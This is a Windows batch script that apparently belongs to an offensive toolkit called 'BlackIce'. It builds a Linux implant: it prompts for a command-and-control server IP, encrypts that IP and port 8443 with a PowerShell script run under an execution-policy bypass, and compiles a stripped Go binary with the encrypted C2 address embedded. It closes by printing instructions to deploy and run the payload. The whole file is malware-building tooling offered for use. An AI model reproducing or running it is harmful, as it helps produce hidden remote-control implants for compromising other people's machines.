@echo off
echo ════════════════════════════════════════════════
echo   BLACKICE LINUX PAYLOAD BUILDER
echo ════════════════════════════════════════════════
echo.

set /p C2_IP="C2 Server IP: "
if "%C2_IP%"=="" set C2_IP=127.0.0.1

echo.
echo [+] Building for %C2_IP%:8443...

REM Encrypt in tools directory
cd /d %~dp0
powershell -NoProfile -ExecutionPolicy Bypass -File encrypt.ps1 -ip "%C2_IP%" -port "8443"

set /p ENC=<enc.tmp
for /f "tokens=1,2 delims=|" %%a in ("%ENC%") do (
    set ENC_IP=%%a
    set ENC_PORT=%%b
)
del enc.tmp

REM Change to project root
cd /d %~dp0\..

REM Build
set GOOS=linux
set GOARCH=amd64
go build -ldflags "-s -w -X main.ENCRYPTED_C2_SERVER=%ENC_IP% -X main.ENCRYPTED_C2_PORT=%ENC_PORT%" -o payloads\implants\payload implants\linux\blackice-linux-ultimate.go

if exist payloads\implants\payload (
    echo.
    echo ════════════════════════════════════════════════
    echo   SUCCESS!
    echo ════════════════════════════════════════════════
    echo.
    echo File: payloads\implants\payload
    echo.
    echo Deploy:  chmod +x payload ^&^& ./payload
    echo.
) else (
    echo.
    echo BUILD FAILED!
)

pause
